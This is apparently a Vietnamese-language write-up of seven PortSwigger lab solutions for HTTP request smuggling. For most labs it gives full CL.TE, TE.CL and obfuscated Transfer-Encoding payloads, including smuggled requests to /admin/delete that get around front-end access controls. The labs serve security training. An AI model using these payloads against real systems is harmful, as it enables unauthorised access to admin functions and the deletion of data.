# [Portswigger] HTTP request smuggling

***

## 1. Lab: HTTP request smuggling, basic CL.TE vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
* Giao diện web:

<img width="598" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ae9cf1d-c0b7-470c-98b7-7e7852a7bf97">

* Exploit:

Thực hiện `Change Request Method` sang từ `GET` thành `POST`, lưu ý chuyển sang sử dụng `HTTP/1.1`

Tiến hành send request trên 2 lần => Đến lần thứ 2 sẽ ra thông báo lỗi như yêu cầu của đề bài.

![telegram-cloud-photo-size-5-6127662865662981520-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/65aa6883-737f-467f-af44-65c6e95be974)

Lab Solved!!!

![telegram-cloud-photo-size-5-6127662865662981521-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e7e5cb93-e7bb-4b4c-a22f-f848f18db027)

***
## 2. Lab: HTTP request smuggling, basic TE.CL vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
* Exploit:

```
POST / HTTP/1.1
Host: 0a5700bd049eb5f080b3262900b000fa.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

x=1
0


```

<img width="623" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1bbb7951-f460-4787-98ae-c1ee22e921b0">

***

## 3. Lab: HTTP request smuggling, obfuscating the TE header

* Content:
```
This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```

* Exploit:
```
POST / HTTP/1.1
Host: 0a8f00030302867584f35f9500110006.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0



```
<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ce94f9e0-f028-48cf-b177-05f0fad27c25">

<img width="621" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/46cb025c-799e-468e-a2b6-8888cf946704">

***

## 4. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

* Exploit:

Lưu ý của bài này là biết cách sử dụng đúng của `Transfer-Encoding: chunk`. e=14 character => độ dài của `q=smuggling123` là 14.

```
POST / HTTP/1.1
Host: 0acc008a03189284827d56400078008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Transfer-Encoding: chunked

e
q=smuggling123
0

GET /404 HTTP/1.1
x: x
```

<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/de9271cf-b836-49b7-b6b5-bdb71e2b3613">

<img width="602" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40fdc7bd-3f12-465f-b85c-d8cbe831ec94">

***
## 5. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

* Content:
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

* Exploit:

```
POST / HTTP/1.1
Host: 0a8a0045041de09184d61ec300a80066.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
0


```
Giải thích: 
- 5e unhex = 94 = Độ dài của phần 
```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
```
- Do backend không hỗ trợ `Transfer-Encoding` + `Content-Lenghth: 4` => Phần sau 5e sẽ được backend hiểu là thuộc Request riêng biệt.
- Request riêng này như sau:
```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

x=1POST / HTTP/1.1
```
- `Content-Length: 18` = số ký tự của `x=1POST / HTTP/1.1`

<img width="479" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c9dce484-9eaf-40a5-9d59-fb9a60f608f0">

***
## 6. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
```
* Exploit:

Thực hiện gửi request Payload đầu tiên như ảnh dưới đây 2 lần => Kết quả báo Request Smugged bị chặn.
<img width="480" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/42f634d4-7ca2-43e2-b2de-d0b3db1db6c4">

Bổ sung thêm thường Request header `Host: localhost` vào Payload => Lần này ứng dụng báo lỗi `Duplicate header names are not allowed`.
<img width="470" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/23dfe300-466e-4b92-9496-9e442b3a028a">

Nguyên nhân là sau khi gửi Request 2 lần thì Request Smugged sẽ trở thành như sau:
```
GET /admin HTTP/1.1
Host: localhost
POST / HTTP/1.1
Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
Connection: close
...
```
=> Bị trùng trường `Host` header 2 lần.

Bây giờ cần chỉnh sửa payload như sau để phần Host Header của Request sau Không ăn vào Phần Header của Smugged Request mà ăn xuống phần Body.
<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9518ba8d-d316-4b25-bfbf-8eec2589be37">
=> Khi này Request Smugged sẽ như sau:
```
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=bPOST / HTTP/1.1
Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
....
```

Tiếp tục thực hiện Smugged Request gọi đến link `/admin/delete?username=carlos` theo yêu cầu của Challenge:

Full payload như sau:
```
POST / HTTP/1.1
Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
```
<img width="484" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4db05e14-49ad-4ea9-a7b8-55c8b842cec8">

Lab Solved!

<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f60dbfbf-97ce-4d95-a902-b8652472932f">

***

## 7. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
```

* Exploit:

<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c6e959a6-ce3f-46d8-b0c2-0968bd2ecef8">

Gọi đến link delete:

<img width="472" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5dd0822c-2a6d-4936-9b9d-6f9edbeb0d0e">

Full payload như sau:

```
POST / HTTP/1.1
Host: 0a64008c03fb619d82b6b5d400a200dc.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
0


```

Lab Solved!

<img width="589" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f73bbf7c-9eb2-479d-b1c3-577c9a709f14">

